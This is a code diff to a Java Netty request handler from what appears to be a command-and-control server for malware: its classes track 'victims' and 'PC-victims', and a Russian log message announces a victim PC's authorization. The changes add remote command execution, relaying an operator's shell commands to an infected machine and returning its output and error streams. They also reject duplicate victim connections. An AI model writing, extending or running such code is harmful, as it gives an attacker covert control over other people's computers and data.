@@ -153,6 +153,9 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                     DownloadManager downloadManager = new DownloadManager(user, targetVictim, (String) request.get("path"));
                     downloadManager.start();
                     break;
+                case "cmd":
+                    targetPCVictim.sendCmd((String) request.get("command"), user.getLogin());
+                    break;
                 default:
                     user.sendErrorCode(Config.INCORRECT_QUERY);
             }
@@ -263,6 +266,9 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                     break;
                 case "set.login.ips":
 //                    targetUser.sendSetLoginIps((String) request.get("code"), victim.getName());
+                    break;
+                case "cmd":
+                    targetUser.sendCmd((String) request.get("out"), (String) request.get("errorOut"), pcVictim.getName());
                     break;
                 default:
                     pcVictim.sendErrorCode(Config.INCORRECT_QUERY);
@@ -505,7 +511,17 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                 return;
             }
 
-            nettyServer.disconnectPCVictimsByName(name);
+            //nettyServer.disconnectPCVictimsByName(name);
+            if (nettyServer.getPCVictimByName(name) != null) {
+                System.out.println("PCVictim с таким именем уже авторизовано!");
+                ctx.close();
+                try {
+                    Thread.sleep(5000);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+                return;
+            }
             PCVictim newPCVictim = new PCVictim(ctx, name);
             nettyServer.getPcVictims().put(ctx.channel().id(), newPCVictim);
             System.out.println("ПК-Жертва " + name + " авторизовалась!");
